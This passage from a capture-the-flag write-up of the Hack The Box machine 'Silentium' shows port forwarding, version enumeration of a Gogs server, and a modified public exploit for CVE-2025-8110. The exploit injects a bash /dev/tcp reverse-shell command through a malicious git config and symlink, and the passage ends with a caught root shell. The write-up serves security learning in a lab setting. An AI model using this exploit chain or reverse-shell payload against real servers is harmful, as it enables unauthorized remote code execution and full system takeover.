	<meta name="_csrf" content="ZH3qvZR0PJaMOumn1HxYwNskdRs6MTc4NzU4MjIxNDY0OTYxMDU5OA" />
	<meta name="_suburl" content="" />

	
	
		<meta property="og:url" content="http://staging-v2-code.dev.silentium.htb:3001/" />
		<meta property="og:type" content="website" />
		<meta property="og:title" content="Gogs">
		<meta property="og:description" content="Gogs is a painless self-hosted Git service.">
		<meta property="og:image" content="http://staging-v2-code.dev.silentium.htb:3001/img/favicon.png" />
		<meta property="og:site_name" content="Gogs">
	

	<link rel="shortcut icon" href="/img/favicon.png" />

    <snip>
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=curlgogs %}

<br />
Port forward the 3001 to your attacking machine.

{% capture portforward %}
┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
└──╼ [★]$ ssh -L 3001:localhost:3001 ben@silentium.htb
ben@silentium.htb's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Apr  8 07:12:54 PM UTC 2026

  System load:           0.24
  Usage of /:            82.6% of 13.37GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             259
  Users logged in:       0
  IPv4 address for eth0: 10.129.234.54
  IPv6 address for eth0: dead:beef::250:56ff:feb9:435c

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

68 updates can be applied immediately.
52 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Aug 24 14:42:38 2026 from 10.10.15.20
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=portforward %}

<br />
Check the Gogs landing page.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/silentium/landingpage3001.png" title="Gogs Landing Page 3001" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Try registering a new user.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/silentium/registeruser.png" title="Register User" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Authenticate as said new user.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/silentium/authenticateuser.png" title="Authenticate User" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Add the subdomain to the `/etc/hosts` file.

{% capture gogshosts %}
┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
└──╼ [★]$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	pwnbox7.1
10.129.245.103  silentium.htb staging.silentium.htb staging-v2-code.dev.silentium.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
127.0.0.1 localhost
127.0.1.1 htb-oldwz1kkne htb-oldwz1kkne.htb-cloud.com
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=gogshosts %}

<br />
Check the new subdomain to ensure that it is still the Gogs from earlier.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/silentium/gogs.png" title="Gogs Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use the binary directly to get the version number.

{% capture getversion %}
ben@silentium:/opt/gogs/gogs$ ./gogs --version
Gogs version 0.13.3
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=getversion %}

<br />
Search for that version and find an exploit for Gogs.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/silentium/gogsexploit.png" title="Gogs Exploit" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://github.com/zAbuQasem/gogs-CVE-2025-8110/tree/main">https://github.com/zAbuQasem/gogs-CVE-2025-8110/tree/main</a>

<br />
Download the new exploit into our working folder.

{% capture downloadgogsexploit %}
┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-ach1lmuueq]─[~/my_data/machines/silentium]
└──╼ [★]$ wget https://raw.githubusercontent.com/zAbuQasem/gogs-CVE-2025-8110/refs/heads/main/CVE-2025-8110.py
--2026-08-26 12:25:32--  https://raw.githubusercontent.com/zAbuQasem/gogs-CVE-2025-8110/refs/heads/main/CVE-2025-8110.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7876 (7.7K) [text/plain]
Saving to: ‘CVE-2025-8110.py’

CVE-2025-8110.py                                100%[=====================================================================================================>]   7.69K  --.-KB/s    in 0s      

2026-08-26 12:25:32 (97.6 MB/s) - ‘CVE-2025-8110.py’ saved [7876/7876]
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=downloadgogsexploit %}

<br />
Start a netcat listener...again.

{% capture startnetcatlistener %}
┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-ach1lmuueq]─[~/my_data/machines/silentium]
└──╼ [★]$ sudo nc -nlvp 443
Listening on 0.0.0.0 443
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=startnetcatlistener %}

<br />
Run the exploit.

{% capture rungogsexploit %}
┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-ach1lmuueq]─[~/my_data/machines/silentium]
└──╼ [★]$ python3 CVE-2025-8110.py -u http://staging-v2-code.dev.silentium.htb -lh 10.10.15.20 -lp 443
Registration failed: 200
[-] Error: Registration failed
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=rungogsexploit %}

<br />
Update the script to use the doink user from earlier.

{% capture updateexploit %}

<snip>

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True, help="Gogs base URL")
    parser.add_argument("-lh", "--host", required=True, help="Attacker host")
    parser.add_argument("-lp", "--port", required=True, help="Attacker port")
    parser.add_argument("-x", "--proxy", action="store_true", help="Use proxy")
    args = parser.parse_args()
    session = requests.Session()
    if args.proxy:
        session.proxies.update(proxies)
    session.verify = False
    username = "doink"
    password = "letmein"
    command = f"bash -c 'bash -i >& /dev/tcp/{args.host}/{args.port} 0>&1' #"
    try:
        login(session, args.url, username, password)
        token = get_application_token(session, args.url)
        repo_name = create_malicious_repo(session, args.url, token)
        git_config = f"""[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	ignorecase = true
	precomposeunicode = true
  sshCommand = {command}
[remote "origin"]
	url = git@localhost:gogs/{repo_name}.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
"""
        upload_malicious_symlink(args.url, username, password, repo_name)
        exploit(session, args.url, token, username, repo_name, git_config)

    except Exception as e:
        console.print(f"[bold red][-] Error: {e}[/bold red]")


if __name__ == "__main__":
    main()
{% endcapture %}
{% include terminal.html language='python' title='CVE-2025-8110.py' content=updateexploit %}

<br />
Run the script again.

{% capture runexploitagain %}
┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-ach1lmuueq]─[~/my_data/machines/silentium]
└──╼ [★]$ python3 CVE-2025-8110.py -u http://staging-v2-code.dev.silentium.htb -lh 10.10.15.20 -lp 443
[+] Authenticated successfully
Token generation status: 200
[+] Application token: 4909908d0b1b27b61438a0dc4a2450827c6f0916
Repo creation status: 201
Cloning into '/tmp/45d2ba1ff5a4'...
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
Unpacking objects: 100% (3/3), 250 bytes | 250.00 KiB/s, done.
[master 3b53fa4] Add malicious symlink
 1 file changed, 1 insertion(+)
 create mode 120000 malicious_link
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 4 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 292 bytes | 292.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
To http://staging-v2-code.dev.silentium.htb/doink/45d2ba1ff5a4.git
   eaa8bab..3b53fa4  master -> master
[+] Exploit sent, check your listener!
[-] Error: HTTPConnectionPool(host='staging-v2-code.dev.silentium.htb', port=80): Read timed out. (read timeout=5)
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=runexploitagain %}

<br />
Check the listener and catch the shell.

{% capture catchshellagain %}
└──╼ [★]$ sudo nc -nlvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.245.103 34760
bash: cannot set terminal process group (1476): Inappropriate ioctl for device
bash: no job control in this shell
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/2#
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=catchshellagain %}

<br />
Get the root.txt flag.

{% capture rootflag %}
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/2# cat /root/root.txt
cat /root/root.txt
<redacted>
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/2# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:95:a3:06 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.129.245.103/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 2654sec preferred_lft 2654sec
    inet6 dead:beef::250:56ff:fe95:a306/64 scope global dynamic mngtmpaddr 
       valid_lft 86394sec preferred_lft 14394sec
    inet6 fe80::250:56ff:fe95:a306/64 scope link 
       valid_lft forever preferred_lft forever
3: br-2141d27c70d6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether b2:f6:a1:e4:92:da brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-2141d27c70d6
       valid_lft forever preferred_lft forever
    inet6 fe80::b0f6:a1ff:fee4:92da/64 scope link 
       valid_lft forever preferred_lft forever
4: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 32:a0:63:ff:bc:2c brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
5: veth6f84bf3@if2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-2141d27c70d6 state UP group default 
    link/ether 32:51:19:13:e5:31 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::3051:19ff:fe13:e531/64 scope link 
       valid_lft forever preferred_lft forever
6: veth79f6220@if2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-2141d27c70d6 state UP group default 
    link/ether ae:d8:70:07:2b:c6 brd ff:ff:ff:ff:ff:ff link-netnsid 1
    inet6 fe80::acd8:70ff:fe07:2bc6/64 scope link 
       valid_lft forever preferred_lft forever
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=rootflag %}

<br />
And with that, we will be silent no more as we crack the Silentium box.  Hope you enjoyed the read.  See you in the next one!

<br/>
<h2>Trophy</h2>

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/silentium/trophy.png" title="Trophy" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
